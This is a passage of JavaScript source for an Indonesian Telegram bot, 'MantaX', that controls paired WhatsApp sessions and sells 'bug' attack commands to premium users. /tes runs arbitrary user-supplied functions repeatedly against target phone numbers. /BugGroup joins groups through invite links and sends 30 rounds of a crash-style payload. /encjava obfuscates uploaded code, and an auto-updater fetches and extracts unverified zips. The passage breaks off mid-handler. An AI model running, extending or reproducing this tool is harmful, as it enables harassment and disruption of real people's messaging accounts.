            console.log(`[MantaX] Skip auto-reconnect Key: ${clientKey} (Belum registered/Pairing gagal)`);
            continue;
          }
        } catch (e) {
          continue;
        }
      }

      console.log(`[MantaX] Auto-reconnect sesi Key: ${clientKey}`);
      try {
        await initWhatsappForUser(Number(uid), phoneNumber, false, 0);
        await new Promise(r => setTimeout(r, 2000));
      } catch (err) {
        console.error(`[MantaX] Gagal auto-reconnect Key ${clientKey}:`, err.message);
      }
    }

    console.log('[MantaX] Auto-reconnect startup selesai.');
  } catch (err) {
    console.error('[MantaX] Error saat auto-reconnect startup:', err);
  }
})();

bot.onText(/\/reqpair (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(chatId, `\`\`\`
✘ мαηтα'χ — AKSES DITOLAK
♛ Status  : Bukan Owner / Admin
♛ Info    : Lu Siapa? Emang Gw Kenal?
༒︎ •၊၊||၊|།||||།‌‌‌‌‌၊|• мαηтα'χ
\`\`\``, { parse_mode: "Markdown" });
  }

  if (!match[1]) {
    return bot.sendMessage(chatId, `\`\`\`
✘ мαηтα'χ — FORMAT SALAH
♛ Contoh  : /reqpair 62xxxx
༒︎ •၊၊||၊|།||||།‌‌‌‌‌၊|• мαηтα'χ
\`\`\``, { parse_mode: "Markdown" });
  }

  const botNumber = match[1].replace(/[^0-9]/g, "");

  const opts = {
    reply_markup: {
      inline_keyboard: [
        [
          { text: ".☘︎ ݁˖ Pairing Via WA", callback_data: `pair_wa_${botNumber}`, icon_custom_emoji_id: "5197352392054327515", style: "danger" },
          { text: ".☘︎ ݁˖ Pairing Via TELE", callback_data: `pair_tele_${botNumber}`, icon_custom_emoji_id: "5197352392054327515", style: "danger" }
        ]
      ]
    },
    parse_mode: "Markdown"
  };

  bot.sendMessage(
    chatId,
    `\`\`\`
✘ мαηтα'χ — OTAX PAIRING
♛ Device  : ${botNumber}
♛ Status  : System Ready

>> PILIH METODE PAIRING :
༒︎ •၊.,||.,|།||||།‌‌‌‌‌၊|• мαηтα'χ
\`\`\``,
    opts
  );
});

bot.on('callback_query', async (query) => {
  const chatId = query.message.chat.id;
  const messageId = query.message.message_id;
  const data = query.data;

  bot.answerCallbackQuery(query.id).catch(() => { });

  if (data.startsWith('pair_wa_')) {
    const botNumber = data.replace('pair_wa_', '');
    bot.deleteMessage(chatId, messageId).catch(() => { });

    await initWhatsappForUser(chatId, botNumber, true, 0);

  } else if (data.startsWith('pair_tele_')) {
    const botNumber = data.replace('pair_tele_', '');
    bot.deleteMessage(chatId, messageId).catch(() => { });

    try {
      await connectToWhatsApp(botNumber, chatId);
    } catch (error) {
      bot.sendMessage(chatId, "Terjadi kesalahan saat menghubungkan.");
    }
  }
});

const moment = require('moment');

bot.onText(/\/setjeda (\d+[smh])/, (msg, match) => {
  const chatId = msg.chat.id;
  const response = setCooldown(match[1]);

  bot.sendMessage(chatId, response);
});

bot.onText(/\/encjava/, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const userId = msg.from.id.toString();

  if (!msg.reply_to_message || !msg.reply_to_message.document) {
    return bot.sendMessage(chatId, "🙈 *Error:* Balas file .js dengan `/encjava`!", { parse_mode: "Markdown" });
  }

  const file = msg.reply_to_message.document;
  if (!file.file_name.endsWith(".js")) {
    return bot.sendMessage(chatId, "🙈 *Error:* Hanya file .js yang didukung!", { parse_mode: "Markdown" });
  }

  const encryptedPath = path.join(__dirname, `OTAX-encrypted-${file.file_name}`);

  try {
    const progressMessage = await bot.sendMessage(chatId, "🔒 Memulai proses enkripsi...");

    await updateProgress(bot, chatId, progressMessage, 10, "Mengunduh File");


    const fileData = await bot.getFile(file.file_id);
    const fileUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${fileData.file_path}`;
    const response = await axios.get(fileUrl, { responseType: "arraybuffer" });
    let fileContent = response.data.toString("utf-8");

    await updateProgress(bot, chatId, progressMessage, 20, "Mengunduh Selesai");


    try {
      new Function(fileContent);
    } catch (syntaxError) {
      throw new Error(`Kode awal tidak valid: ${syntaxError.message}`);
    }

    await updateProgress(bot, chatId, progressMessage, 40, "Inisialisasi Enkripsi");


    const obfuscated = await JsConfuser.obfuscate(fileContent, getAphocalypsObfuscationConfig());
    let obfuscatedCode = obfuscated.code || obfuscated;

    if (typeof obfuscatedCode !== "string") {
      throw new Error("Hasil obfuscation bukan string");
    }


    try {
      new Function(obfuscatedCode);
    } catch (postObfuscationError) {
      throw new Error(`Hasil obfuscation tidak valid: ${postObfuscationError.message}`);
    }

    await updateProgress(bot, chatId, progressMessage, 80, "Finalisasi Enkripsi");

    await fs.promises.writeFile(encryptedPath, obfuscatedCode);


    await bot.sendDocument(chatId, encryptedPath, {
      caption: "🔥 *File terenkripsi (мαηтα'χxx Chaos Core) siap!*\n_©OtaXxx ENC_",
      parse_mode: "Markdown"
    });

    await updateProgress(bot, chatId, progressMessage, 100, "мαηтα'χxx Chaos Core Selesai");


    try {
      await fs.promises.access(encryptedPath);
      await fs.promises.unlink(encryptedPath);
    } catch (err) {
      console.error("Gagal menghapus file:", err.message);
    }
  } catch (error) {
    console.error("Encjava error:", error);
    await bot.sendMessage(chatId, `🙈 *Kesalahan:* ${error.message || "Tidak diketahui"}\n_Coba lagi dengan kode Javascript yang valid!_`, { parse_mode: "Markdown" });


    try {
      await fs.promises.access(encryptedPath);
      await fs.promises.unlink(encryptedPath);
    } catch (err) {
      console.error("Gagal menghapus file:", err.message);
    }
  }
});
bot.onText(/\/groupon/, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (!isOwner(senderId)) {
    return bot.sendMessage(
      chatId,
      "𝘿𝙖𝙣 𝙔𝙖𝙥!? 𝙀𝙣𝙩𝙚 𝙎𝙞𝙖𝙥𝙖? 𝙔𝙖𝙣𝙜 𝘽𝙞𝙨𝙖 𝙈𝙖𝙠𝙚 𝘾𝙪𝙢𝙖𝙣 𝙊𝙬𝙣𝙚𝙧 𝙂𝙬!!✘𓂸",
      { parse_mode: "Markdown" }
    );
  }

  try {
    setOnlyGroup(true); // Aktifkan mode hanya grup
    await bot.sendMessage(chatId, "✅ Mode hanya grup diaktifkan!");
  } catch (error) {
    console.error("Kesalahan saat mengaktifkan mode hanya grup:", error);
    await bot.sendMessage(chatId, "❌ Terjadi kesalahan saat mengaktifkan mode hanya grup.");
  }
});

bot.onText(/\/groupoff/, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const delay = ms => new Promise(res => setTimeout(res, ms));

  if (!isOwner(senderId)) {
    return bot.sendMessage(
      chatId,
      "𝘿𝙖𝙣 𝙔𝙖𝙥!? 𝙀𝙣𝙩𝙚 𝙎𝙞𝙖𝙥𝙖? 𝙔𝙖𝙣𝙜 𝘽𝙞𝙨𝙖 𝙈𝙖𝙠𝙚 𝘾𝙪𝙢𝙖𝙣 𝙊𝙬𝙣𝙚𝙧 𝙂𝙬!!✘𓂸",
      { parse_mode: "Markdown" }
    );
  }

  try {
    setOnlyGroup(false); // Nonaktifkan mode hanya grup
    await bot.sendMessage(chatId, "✅ Mode hanya grup dinonaktifkan!");
  } catch (error) {
    console.error("Kesalahan saat menonaktifkan mode hanya grup:", error);
    await bot.sendMessage(chatId, "❌ Terjadi kesalahan saat menonaktifkan mode hanya grup.");
  }
});


const GHuptele = {
  owner: "OtaStoree",
  repo: "MantaXx",
  ref: "main",
  versionPath: "version.json"
};

function nowWITA() {
  try {
    return new Date().toLocaleString("id-ID", { timeZone: "Asia/Makassar", hour12: false });
  } catch {
    return new Date().toISOString().replace("T", " ").slice(0, 19);
  }
}

function __updBox(lines) {
  return ["╭────────────────────", "│ " + lines.join("\n│ "), "╰────────────────────"].join("\n");
}

const __UPD = {
  BUSY: false,
  AUTO_ENABLED: true,
  AUTO_INTERVAL_MS: 60000,
  AUTO_TIMER: null,
  LOCAL_VERSION: 0,
  FLAG_FILE: path.join(process.cwd(), ".manta_update.json")
};

let __autoOwnerChatId = null;

function __loadState() {
  try {
    const d = JSON.parse(fs.readFileSync(__UPD.FLAG_FILE));
    __UPD.AUTO_ENABLED = !!d.enabled;
    __UPD.LOCAL_VERSION = d.version || 0;
  } catch { }
}

function __saveState() {
  try {
    fs.writeFileSync(__UPD.FLAG_FILE, JSON.stringify({
      enabled: __UPD.AUTO_ENABLED,
      version: __UPD.LOCAL_VERSION,
      updated_at: Date.now()
    }));
  } catch { }
}

async function __getRemoteVersion() {
  const url = `https://raw.githubusercontent.com/${GHuptele.owner}/${GHuptele.repo}/${GHuptele.ref}/${GHuptele.versionPath}`;
  const res = await axios.get(url, { timeout: 15000 });
  return res.data;
}

async function __downloadZip(url) {
  const res = await axios.get(url, {
    responseType: "arraybuffer",
    timeout: 30000
  });
  return res.data;
}

async function __doUpdate(chatId, fromAuto = false) {
  if (__UPD.BUSY) return;
  __UPD.BUSY = true;

  try {
    const remote = await __getRemoteVersion();

    if (!remote || !remote.version) {
      __UPD.BUSY = false;
      return;
    }

    if (remote.version === __UPD.LOCAL_VERSION) {
      if (chatId && !fromAuto) {
        await bot.sendMessage(chatId, __updBox([
          "мαηтα'χ — CEK UPDATE",
          "⎈ Status : terbaru",
          "⎈ Versi  : " + __UPD.LOCAL_VERSION,
          "⎈ Waktu  : " + nowWITA()
        ]));
      }
      __UPD.BUSY = false;
      return;
    }

    if (chatId) {
      await bot.sendMessage(chatId, __updBox([
        "мαηтα'χ — UPDATE TERDETEKSI",
        "⎈ Versi lama : " + __UPD.LOCAL_VERSION,
        "⎈ Versi baru : " + remote.version,
        "⎈ Waktu      : " + nowWITA()
      ]));
    }

    const zipBuffer = await __downloadZip(remote.zip_url);
    const zip = new AdmZip(zipBuffer);

    zip.extractAllTo(process.cwd(), true);

    __UPD.LOCAL_VERSION = remote.version;
    __saveState();

    if (chatId) {
      await bot.sendMessage(chatId, "⸙ мαηтα'χ — ✅ Update selesai, restart...");
    }

    setTimeout(() => process.exit(0), 2000);

  } catch (e) {
    if (chatId && !fromAuto) {
      await bot.sendMessage(chatId, "⎙ Gagal update");
    }
  }

  __UPD.BUSY = false;
}

async function __autoUpdateTick() {
  if (!__UPD.AUTO_ENABLED || __UPD.BUSY) return;

  try {
    const remote = await __getRemoteVersion();
    if (!remote || remote.version === __UPD.LOCAL_VERSION) return;

    const msg = __updBox([
      "мαηтα'χ — AUTO UPDATE",
      "⎈ Versi baru : " + remote.version,
      "⎈ Mulai 5 detik..."
    ]);

    if (__autoOwnerChatId) {
      await bot.sendMessage(__autoOwnerChatId, msg);
    }

    await new Promise(r => setTimeout(r, 5000));
    await __doUpdate(__autoOwnerChatId, true);

  } catch { }
}

function __startAutoLoop() {
  if (__UPD.AUTO_TIMER) clearInterval(__UPD.AUTO_TIMER);
  __UPD.AUTO_TIMER = setInterval(__autoUpdateTick, __UPD.AUTO_INTERVAL_MS);
  setTimeout(__autoUpdateTick, 10000);
}

function __stopAutoLoop() {
  if (__UPD.AUTO_TIMER) {
    clearInterval(__UPD.AUTO_TIMER);
    __UPD.AUTO_TIMER = null;
  }
}

__loadState();
__UPD.AUTO_ENABLED = true;
__startAutoLoop();

bot.onText(/^\/update$/i, async (msg) => {
  if (!isOwner(msg.from.id)) return;
  await __doUpdate(msg.chat.id, false);
});

bot.onText(/^\/cekupdate$/i, async (msg) => {
  if (!isOwner(msg.from.id)) return;

  try {
    const remote = await __getRemoteVersion();

    await bot.sendMessage(msg.chat.id, __updBox([
      "мαηтα'χ — STATUS",
      "⎈ Lokal  : " + __UPD.LOCAL_VERSION,
      "⎈ Remote : " + (remote.version || 0),
      "⎈ Status : " + (remote.version === __UPD.LOCAL_VERSION ? "terbaru" : "ADA UPDATE"),
      "⎈ Auto   : " + (__UPD.AUTO_ENABLED ? "ON" : "OFF"),
      "⎈ Waktu  : " + nowWITA()
    ]));

  } catch {
    await bot.sendMessage(msg.chat.id, "Gagal cek");
  }
});

bot.onText(/^\/upon$/i, async (msg) => {
  if (!isOwner(msg.from.id)) return;

  __UPD.AUTO_ENABLED = true;
  __autoOwnerChatId = msg.chat.id;
  __saveState();
  __startAutoLoop();

  await bot.sendMessage(msg.chat.id, "Auto update ON");
});

bot.onText(/^\/upoff$/i, async (msg) => {
  if (!isOwner(msg.from.id)) return;

  __UPD.AUTO_ENABLED = false;
  __saveState();
  __stopAutoLoop();

  await bot.sendMessage(msg.chat.id, "Auto update OFF");
});
const DIGIT_RE = /\d{6,16}/g
const TZ = "Asia/Makassar"
const nowID = () => new Date().toLocaleString("id-ID", { timeZone: TZ, hour12: false })

const CODE_FENCE_RE = /^\s*```(?:json)?\s*([\s\S]*?)\s*```\s*$/i;

function extractTextOrCaption(m) {
  return (m?.text || m?.caption || "").trim();
}

function extractJsonString(s) {
  if (!s) return "";
  const fenced = s.match(CODE_FENCE_RE);
  if (fenced) return fenced[1];
  return s.trim();
}

function toWaJid(s) {
  if (!s) return s;
  if (/@s\.whatsapp\.net$/.test(s)) return s;
  const digits = s.replace(/[^\d]/g, "");
  return digits ? `${digits}@s.whatsapp.net` : s;
}
const unfence = s => {
  if (!s) return ""
  const m = s.match(CODE_FENCE_RE)
  return m ? m[1].trim() : s.trim()
}

const parseTargets = s =>
  Array.from(
    new Set(
      (s?.match(DIGIT_RE) || [])
        .map(n => n.replace(/\D/g, ""))
        .filter(Boolean)
    )
  )

const normalizeUserFunction = src => {
  if (typeof src !== "string") return src
  let out = src.trim()
  out = out.replace(/\bchalk\.(\w+)\s*\(/g, "console.log(")
  out = out.replace(/\b(await\s+)?(sock|socket|conn)\./g, "$1otax.")
  out = out.replace(
    /(async\s+function\s*\w*\s*)\(([^)]*)\)/g,
    (full, head, params) => {
      const p = params.split(",").map(s => s.trim()).filter(Boolean)
      if (p.length === 1 && p[0] === "target") return `${head}(otax, target)`
      if (p.length === 2 && ["sock", "socket", "conn"].includes(p[0]) && p[1] === "target")
        return `${head}(otax, target)`
      return full
    }
  )
  out = out.replace(
    /(async\s*)?\(([^)]*)\)\s*=>/g,
    (full, asyncPart, params) => {
      const p = params.split(",").map(s => s.trim()).filter(Boolean)
      if (p.length === 1 && p[0] === "target") return `${asyncPart || ""}(otax, target) =>`
      if (p.length === 2 && ["sock", "socket", "conn"].includes(p[0]) && p[1] === "target")
        return `${asyncPart || ""}(otax, target) =>`
      return full
    }
  )
  return out
}

const toFunction = src => {
  const safeSrc = normalizeUserFunction(src)

  const runner = new Function(
    "otax",
    "target",
    "ctx",
    `"use strict";
const {
  generateWAMessageFromContent,
  generateWAMessage,
  prepareWAMessageMedia,
  relayWAMessage,
  proto,
  sleep,
  crypto
} = ctx;

let fn = (${safeSrc});
if (typeof fn !== "function") throw new Error("Source is not a function");

return Promise.resolve(fn(otax, target, ctx));
`
  )

  return (otax, target, ctx) => runner(otax, target, ctx)
}
bot.onText(/^\/tes\s+(\d+)\s+([\s\S]+)/i, async (msg, match) => {
  const chatId = msg.chat.id
  const senderId = msg.from.id
  const delay = ms => new Promise(res => setTimeout(res, ms))
  const loops = Math.max(1, parseInt(match[1], 10))
  const targets = parseTargets(match[2])
  const q = msg.reply_to_message

  const escapeHtml = (str = "") =>
    String(str).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;")

  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date()) && !isGroupPremium(chatId)) {
    return bot.sendMessage(chatId, `\`\`\`KAMU TIDAK MEMILIKI AKSES\`\`\`\n( ! ) Silahkan AddPremium Sebelum Menggunakan Bug`, {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "𝘖𝘸𝘯𝘦𝘳", url: settings.OWNER_URL }]]
      }
    });
  }

  if (shouldIgnoreMessage(msg)) return;
  if (sessions.size === 0) {
    if (fs.existsSync(SESSIONS_FILE)) {
      const savedNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));

      if (savedNumbers && savedNumbers.length > 0) {
        const refreshTasks = savedNumbers.map(async (botNumber) => {
          try {
            const sessionDir = createSessionDir(botNumber);
            const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

            const sock = makeWASocket({
              auth: state,
              printQRInTerminal: false,
              logger: P({ level: "silent" }),
              defaultQueryTimeoutMs: undefined,
            });

            return new Promise((resolve) => {
              let done = false;
              const finish = () => {
                if (!done) {
                  done = true;
                  resolve();
                }
              };

              sock.ev.on("connection.update", async (update) => {
                const { connection } = update;
                if (connection === "open") {
                  sessions.set(botNumber, sock);
                  finish();
                } else if (connection === "close") {
                  finish();
                }
              });
              sock.ev.on("creds.update", saveCreds);
              setTimeout(finish, 8000);
            });
          } catch { }
        });

        await Promise.all(refreshTasks);
      }
    }

    if (sessions.size === 0) {
      return bot.sendMessage(chatId, `\`\`\`
✘ мαηтα'χ 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ Status  : Tidak Ada Sender Aktif
♛ Info    : Silahkan ReqPair Terlebih Dahulu
༒︎ •၊၊||၊|།||||།‌‌‌‌‌၊|• мαηтα'χ
\`\`\``, { parse_mode: "Markdown" });
    }
  }

  const otax = sessions.values().next().value;

  let fnText = ""
  try {
    if (q && q.document && /\.js$/i.test(q.document.file_name)) {
      const link = await bot.getFileLink(q.document.file_id)
      const res = await fetch(link)
      fnText = await res.text()
    } else {
      fnText = unfence(extractTextOrCaption(q))
    }
  } catch (err) {
    return bot.sendMessage(chatId, `✘ Gagal membaca file/function: ${escapeHtml(err.message)}`, { parse_mode: "HTML" })
  }

  if (!fnText) return bot.sendMessage(chatId, "✘ Reply teks async function terlebih dahulu", { parse_mode: "HTML" })
  if (targets.length === 0) return bot.sendMessage(chatId, "✘ Sertakan target digit. Contoh: /tes 2 6281234567890 919876543210", { parse_mode: "HTML" })

  let execFn
  try {
    execFn = toFunction(fnText)
  } catch (e) {
    return bot.sendMessage(chatId, `✘ Gagal memuat function: ${escapeHtml(e.message)}`, { parse_mode: "HTML" })
  }

  if (typeof execFn !== "function") {
    return bot.sendMessage(chatId, "✘ Konten reply bukan function", { parse_mode: "HTML" })
  }
  if (!otax) {
    return bot.sendMessage(
      chatId,
      "```⸙ мαηтα'χ — ERROR\n✘ Tidak ada sender aktif.\n✘ Gunakan /reqpair atau /refresh terlebih dahulu.```",
      { parse_mode: "Markdown" }
    )
  }

  const ctx = {
    generateWAMessageFromContent,
    generateWAMessage,
    prepareWAMessageMedia,
    relayWAMessage,
    proto,
    sleep,
    crypto: require("crypto")
  }

  for (const formattedNumber of targets) {
    try {
      const Jid = `${formattedNumber}@s.whatsapp.net`

      const caption = [
        "<b>✘ мαηтα'χ ATTACK YOU! ✘</b>",
        `♛ ターゲット : ${escapeHtml(formattedNumber)}`,
        "♛ 状態 : 𝘚𝘢𝘣𝘢𝘳 𝘔𝘢𝘴𝘪𝘩 𝘗𝘳𝘰𝘴𝘦𝘴 𝘠𝘢𝘬✘....",
        "༒︎ •،،||،|.[||||.[‌‌‌‌‌،|• мαηтα'χ"
      ].join("\n")

      const sent = await bot.sendMessage(chatId, caption, { parse_mode: "HTML" })

      const editCaption = [
        "<b>✘ мαηтα'χ ATTACK YOU! ✘</b>",
        `♛ ターゲット : ${escapeHtml(formattedNumber)}`,
        "♛ プロセス   : 𝘗𝘳𝘰𝘴𝘦𝘴 𝘗𝘦𝘯𝘨𝘪𝘳𝘪𝘮𝘢𝘯 𝘉𝘶𝘨 ✘"
      ].join("\n")

      await bot.editMessageText(editCaption, { chat_id: chatId, message_id: sent.message_id, parse_mode: "HTML" })

      for (let i = 0; i < loops; i++) {
        await execFn(otax, Jid, ctx)
        await delay(220)
      }

      await bot.sendMessage(
        chatId,
        [
          "<b>✘ мαηтα'χ ATTACK YOU! ✘</b>",
          `♛ ターゲット : ${escapeHtml(formattedNumber)}`,
          `♛ タイムタン : ${escapeHtml(nowID())}`,
          "༒︎ •،،||،|.[||||.[‌‌‌‌‌،|• мαηтα'χ"
        ].join("\n"),
        {
          reply_markup: {
            inline_keyboard: [[{ text: "SUCCESS", url: `https://wa.me/${formattedNumber}` }]]
          },
          parse_mode: "HTML"
        }
      )
    } catch (error) {
      await bot.sendMessage(chatId, `⦸ Gagal mengirim bug ke ${escapeHtml(formattedNumber)}: ${escapeHtml(error.message)}`, { parse_mode: "HTML" })
    }
  }
})

bot.onText(/^\/tourl$/i, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date()) && !isGroupPremium(chatId)) {
    return bot.sendMessage(chatId, `\`\`\`KAMU TIDAK MEMILIKI AKSES\`\`\`\n( ! ) Silahkan AddPremium Sebelum Menggunakan Fitur Ini`, {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "𝘖𝘸𝘯𝘦𝘳", url: settings.OWNER_URL }]]
      }
    });
  }

  const q = msg.reply_to_message;
  if (!q) {
    return bot.sendMessage(chatId, `\`\`\`\n✘ мαηтα'χ — REJECTED ✘\n♛ Info    : Reply Gambar/Video/Media!\n༒︎ •၊၊||၊|།||||།‌‌‌‌‌၊|• мαηтα'χ\n\`\`\``, { parse_mode: "Markdown" });
  }

  let fileId;
  let fileName = "file";

  if (q.photo) {
    fileId = q.photo[q.photo.length - 1].file_id;
    fileName = "photo.png";
  } else if (q.video) {
    fileId = q.video.file_id;
    fileName = "video.mp4";
  } else if (q.document) {
    fileId = q.document.file_id;
    fileName = q.document.file_name || "file";
  } else {
    return bot.sendMessage(chatId, `\`\`\`\n✘ мαηтα'χ — ERROR ✘\n♛ Info    : Media Tidak Didukung!\n༒︎ •၊၊||၊|།||||།‌‌‌‌‌၊|• мαηтα'χ\n\`\`\``, { parse_mode: "Markdown" });
  }

  try {
    const statusMsg = await bot.sendMessage(chatId, `\`\`\`\n⸙ мαηтα'χ — PROSES\n♛ Status  : Mengunduh Media...\n\`\`\``, { parse_mode: "Markdown" });

    const fileData = await bot.getFile(fileId);
    const token = typeof BOT_TOKEN !== "undefined" ? BOT_TOKEN : bot.token;
    const fileUrl = `https://api.telegram.org/file/bot${token}/${fileData.file_path}`;
    const response = await axios.get(fileUrl, { responseType: "arraybuffer" });
    const buffer = response.data;

    await bot.editMessageText(`\`\`\`\n⸙ мαηтα'χ — PROSES\n♛ Status  : Mengunggah ke Catbox...\n\`\`\``, { chat_id: chatId, message_id: statusMsg.message_id, parse_mode: "Markdown" });

    const formData = new FormData();
    formData.append('reqtype', 'fileupload');
    formData.append('fileToUpload', new Blob([buffer]), fileName);

    const catboxResponse = await axios.post('https://catbox.moe/user/api.php', formData);
    let teks = catboxResponse.data.trim();

    const finalMsg = `⸙ <b>мαηтα'χ — SUCCESS</b>\n\n♛ <b>Link</b> : ${teks}\n♛ <b>Waktu</b> : ${new Date().toLocaleString("id-ID")}\n\n༒︎ •၊၊||၊|།||||།‌‌‌‌‌၊|• мαηтα'χ`;

    await bot.deleteMessage(chatId, statusMsg.message_id).catch(() => { });
    await bot.sendMessage(chatId, finalMsg, { parse_mode: "HTML", reply_to_message_id: msg.message_id });
  } catch (error) {
    console.error("Error in /tourl:", error);
    await bot.sendMessage(chatId, `\`\`\`\n✘ мαηтα'χ — ERROR ✘\n♛ Detail  : ${error.message || "Terjadi kesalahan"}\n༒︎ •၊၊||၊|།||||།‌‌‌‌‌၊|• мαηтα'χ\n\`\`\``, { parse_mode: "Markdown" });
  }
});

bot.onText(/\/BugGroup(?:\s+(.+))?/i, async (msg, match) => {
  const chatId = msg.chat.id
  const senderId = msg.from.id

  try {
    if (shouldIgnoreMessage(msg)) {
      if (
        msg.chat?.type === "private" &&
        isOnlyGroupEnabled() &&
        String(msg.from?.id) !== String(OWNER_ID)
      ) {
        const uid = msg.from?.id
        const uname = msg.from?.username ? `@${msg.from.username}` : "no_username"
        setTimeout(() => {
          bot.sendMessage(
            String(OWNER_ID),
            `⚠️ мαηтα'χ 𝙒𝘼𝙍𝙉𝙄𝙉𝙂 ⚠️
✘ Akses Private Diblokir

♛ User ID   : ${uid}
♛ Username  : ${uname}
♛ Mode      : GROUP ONLY`
          ).catch(() => { })
        }, 0)
      }
      return
    }

    if (isCommandBlocked("BugGroup") && !isOwner(senderId)) {
      return bot.sendMessage(chatId, `\`\`\`\n✘ мαηтα'χ — COMMAND BLOCKED\n♛ Status  : Sedang Dinonaktifkan\n♛ Info    : Hubungi Owner untuk unblock\n༒︎ •၊၊||၊|།||||།‌‌‌‌‌၊|• мαηтα'χ\n\`\`\``, { parse_mode: "Markdown" });
    }

    if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date()) && !isGroupPremium(chatId)) {
      return bot.sendPhoto(chatId, botLinks.default || defaultLinks.default, {
        caption: `\`\`\`KAMU TIDAK MEMILIKI AKSES\`\`\`\n( ! ) Silahkan AddPremium Sebelum Menggunakan Bug`,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "𝘖𝘸𝘯𝘦𝘳", url: settings.OWNER_URL }]]
        }
      })
    }

    const otax = sessions.values().next().value
    if (!otax) {
      return bot.sendPhoto(chatId, botLinks.default || defaultLinks.default, {
        caption: `\`\`\`
✘ мαηтα'χ 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ Status  : Tidak Ada Sender Aktif
♛ Info    : Silahkan ReqPair Terlebih Dahulu
༒︎ •၊၊||၊|།||||།‌‌‌‌‌၊|• мαηтα'χ
\`\`\``,
        parse_mode: "Markdown"
      })
    }

    if (typeof otax.groupFetchAllParticipating !== "function") {
      return bot.sendMessage(
        chatId,
        "```⸙ мαηтα'χ — ERROR\n✘ Sender belum siap.\n✘ Tunggu 3–5 detik atau /refresh```",
        { parse_mode: "Markdown" }
      )
    }

    const raw = (match[1] || "").trim()

    const groupsAll = await otax.groupFetchAllParticipating().catch(() => ({}))
    const groups = Object.values(groupsAll).map(g => ({
      id: g.id,
      name: g.subject || "-"
    }))

    if (!groups.length) {
      return bot.sendMessage(
        chatId,
        "```⸙ мαηтα'χ — NO GROUP DETECTED\n✘ Tidak ada grup pada sender aktif```",
        { parse_mode: "Markdown" }
      )
    }

    let groupJid = ""
    let groupName = ""

    if (!raw) {
      let text = "⸙ *мαηтα'χ — GROUP LIST*\n\n"
      for (const g of groups) text += `♛ *${g.name}*\n\`${g.id}\`\n\n`
      text += "_Gunakan:_ `/BugGroup <JID | link | nama>`"
      return bot.sendMessage(chatId, text, { parse_mode: "Markdown" })
    }

    if (/@g\.us$/.test(raw)) {
      const found = groups.find(g => g.id === raw)
      if (!found) {
        return bot.sendMessage(chatId, "```⦸ Grup tidak ditemukan (JID).```", { parse_mode: "Markdown" })
      }
      groupJid = found.id
      groupName = found.name
    } else if (/chat\.whatsapp\.com\/[A-Za-z0-9_-]{20,24}/.test(raw)) {
      const code = raw.match(/chat\.whatsapp\.com\/([A-Za-z0-9_-]{20,24})/)?.[1]
      if (!code) {
        return bot.sendMessage(chatId, "```⦸ Link grup tidak valid.```", { parse_mode: "Markdown" })
      }
      let info = await otax.groupGetInviteInfo(code).catch(() => null)
      if (!info?.id) {
        await bot.sendMessage(chatId, "```ꀆ Bot belum join, mencoba masuk grup...```", { parse_mode: "Markdown" })
        await otax.groupAcceptInvite(code).catch(() => null)
        await sleep(4000)
        info = await otax.groupGetInviteInfo(code).catch(() => null)
      }
      if (!info?.id) {
        return bot.sendMessage(chatId, "```⦸ Gagal masuk atau link sudah tidak aktif.```", { parse_mode: "Markdown" })
      }
      groupJid = info.id.endsWith("@g.us") ? info.id : info.id + "@g.us"
      groupName = info.subject || "-"
    } else {
      const q = raw.toLowerCase()
      const found =
        groups.find(g => g.name.toLowerCase() === q) ||
        groups.find(g => g.name.toLowerCase().includes(q))
      if (!found) {
        return bot.sendMessage(chatId, "```⦸ Nama grup tidak ditemukan.```", { parse_mode: "Markdown" })
      }
      groupJid = found.id
      groupName = found.name
    }

    await bot.sendMessage(
      chatId,
      "```\nꀆ Menarget grup...\n♛ " + groupName + "\n♛ " + groupJid + "\n```",
      { parse_mode: "Markdown" }
    )

    const startMsg = await bot.sendMessage(
      chatId,
      "```\n✘ мαηтα'χ ATTACK ✘\n♛ Target : " +
      groupName +
      "\n♛ JID    : " +
      groupJid +
      "\n♛ Status : Mengirim...\n```",
      { parse_mode: "Markdown" }
    ).catch(() => null)

    const cycles = 30
    for (let i = 0; i < cycles; i++) {
      await groupjir(otax, groupJid, false).catch(() => null)
    }

    const final =
      "```\n✘ мαηтα'χ ATTACK COMPLETE ✘\n♛ Target : " +
      groupName +
      "\n♛ JID    : " +
      groupJid +
      "\n♛ Time   : " +
      new Date().toLocaleString("id-ID") +
      "\n```"

    if (startMsg) {
      await bot
        .editMessageCaption(final, {
          chat_id: chatId,
          message_id: startMsg.message_id,
          parse_mode: "Markdown"
        })
        .catch(() => bot.sendMessage(chatId, final, { parse_mode: "Markdown" }))
    } else {
      await bot.sendMessage(chatId, final, { parse_mode: "Markdown" })
    }
  } catch (e) {
    await bot.sendMessage(
      chatId,
      "```⸙ мαηтα'χ — 𝙀𝙍𝙍𝙊𝙍\n✘ Terjadi kesalahan saat menjalankan /BugGroup.\n✘ Detail: " +
      (e?.message || "Unknown error") +
      "```",
      { parse_mode: "Markdown" }
    )
  }
});
bot.onText(/\/DelayGb(?:\s+(.+))?/i, async (msg, match) => {
  const chatId = msg.chat.id
  const senderId = msg.from.id

  try {
    if (shouldIgnoreMessage(msg)) {
      if (
        msg.chat?.type === "private" &&
        isOnlyGroupEnabled() &&
        String(msg.from?.id) !== String(OWNER_ID)
      ) {
        const uid = msg.from?.id
        const uname = msg.from?.username ? `@${msg.from.username}` : "no_username"
        setTimeout(() => {
          bot.sendMessage(
